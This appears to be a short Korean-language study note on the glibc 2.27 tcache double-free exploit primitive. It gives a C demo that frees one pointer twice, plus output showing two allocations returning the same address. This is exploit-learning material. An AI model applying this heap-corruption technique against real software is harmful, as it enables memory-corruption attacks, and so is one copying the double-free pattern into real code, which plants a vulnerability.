---
layout: post
type: note
title: glibc 2.27 tcache exploit
alias: Heap
---

DFB에 대한 별다른 검증이 없다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(){
	uint64_t *ptr1 = malloc(0x20);
	fprintf(stderr,"Allocate ptr1 : %p\n",ptr1);
	free(ptr1);
	fprintf(stderr,"Free ptr1\n");
	free(ptr1);
	fprintf(stderr,"Double Free ptr1\n");
	fprintf(stderr,"Allcate %p, %p",malloc(0x20),malloc(0x20));
}
```

Result

```
Allocate ptr1 : 0x55fdd7ccc260
Free ptr1
Double Free ptr1
Allcate 0x55fdd7ccc260, 0x55fdd7ccc260
```